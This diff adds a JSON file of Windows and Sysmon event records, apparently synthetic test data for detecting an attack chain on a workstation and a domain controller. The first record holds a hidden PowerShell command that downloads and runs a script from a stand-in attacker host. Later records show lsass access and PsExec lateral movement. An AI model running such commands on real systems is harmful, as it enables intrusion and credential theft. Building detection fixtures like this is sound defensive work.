@@ -1,0 +1,121 @@
+[
+  {
+    "id": "a1b2c3d4-0001",
+    "timestamp": "2025-07-05T18:30:00Z",
+    "event_source": "windows_event_log",
+    "event_id": 4688,
+    "hostname": "workstation-123",
+    "user": "jsmith",
+    "process_name": "powershell.exe",
+    "command_line": "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil-domain.com/payload.ps1')\"",
+    "parent_process_name": "outlook.exe"
+  },
+  {
+    "id": "a1b2c3d4-0002",
+    "timestamp": "2025-07-05T18:30:05Z",
+    "event_source": "sysmon",
+    "event_id": 1,
+    "hostname": "workstation-123",
+    "user": "jsmith",
+    "process_name": "cmd.exe",
+    "command_line": "C:\\Windows\\system32\\cmd.exe",
+    "parent_process_name": "powershell.exe"
+  },
+  {
+    "id": "a1b2c3d4-0003",
+    "timestamp": "2025-07-05T18:30:06Z",
+    "event_source": "sysmon",
+    "event_id": 1,
+    "hostname": "workstation-123",
+    "user": "jsmith",
+    "process_name": "whoami.exe",
+    "command_line": "whoami.exe",
+    "parent_process_name": "cmd.exe"
+  },
+  {
+    "id": "a1b2c3d4-0004",
+    "timestamp": "2025-07-05T18:30:10Z",
+    "event_source": "windows_event_log",
+    "event_id": 4624,
+    "hostname": "workstation-456",
+    "user": "bjenkins",
+    "logon_type": 2,
+    "source_ip": "192.168.1.200"
+  },
+  {
+    "id": "a1b2c3d4-0005",
+    "timestamp": "2025-07-05T18:30:12Z",
+    "event_source": "sysmon",
+    "event_id": 1,
+    "hostname": "workstation-123",
+    "user": "jsmith",
+    "process_name": "net.exe",
+    "command_line": "net user",
+    "parent_process_name": "cmd.exe"
+  },
+  {
+    "id": "a1b2c3d4-0006",
+    "timestamp": "2025-07-05T18:30:15Z",
+    "event_source": "sysmon",
+    "event_id": 1,
+    "hostname": "workstation-123",
+    "user": "jsmith",
+    "process_name": "systeminfo.exe",
+    "command_line": "systeminfo",
+    "parent_process_name": "cmd.exe"
+  },
+  {
+    "id": "a1b2c3d4-0007",
+    "timestamp": "2025-07-05T18:31:00Z",
+    "event_source": "sysmon",
+    "event_id": 10,
+    "hostname": "workstation-123",
+    "user": "jsmith",
+    "source_process_name": "powershell.exe",
+    "source_process_id": "1234",
+    "target_process_name": "lsass.exe",
+    "target_process_id": "724"
+  },
+  {
+    "id": "a1b2c3d4-0008",
+    "timestamp": "2025-07-05T18:31:05Z",
+    "event_source": "windows_event_log",
+    "event_id": 4624,
+    "hostname": "dc-01",
+    "user": "jsmith",
+    "logon_type": 3,
+    "source_ip": "192.168.1.101"
+  },
+  {
+    "id": "a1b2c3d4-0009",
+    "timestamp": "2025-07-05T18:31:10Z",
+    "event_source": "windows_event_log",
+    "event_id": 7045,
+    "hostname": "dc-01",
+    "user": "SYSTEM",
+    "service_name": "PSEXESVC",
+    "service_file_name": "%SystemRoot%\\PSEXESVC.exe"
+  },
+  {
+    "id": "a1b2c3d4-0010",
+    "timestamp": "2025-07-05T18:31:11Z",
+    "event_source": "sysmon",
+    "event_id": 1,
+    "hostname": "dc-01",
+    "user": "SYSTEM",
+    "process_name": "PSEXESVC.exe",
+    "command_line": "C:\\Windows\\PSEXESVC.exe",
+    "parent_process_name": "services.exe"
+  },
+  {
+    "id": "a1b2c3d4-0011",
+    "timestamp": "2025-07-05T18:32:00Z",
+    "event_source": "windows_event_log",
+    "event_id": 4688,
+    "hostname": "dc-01",
+    "user": "jsmith",
+    "process_name": "powershell.exe",
+    "command_line": "powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACgAJwBIAGUAbABsAG8AIABmAHIAbwBtACAAZABjAC0AMAAxACcAKQA=",
+    "parent_process_name": "PSEXESVC.exe"
+  }
+]
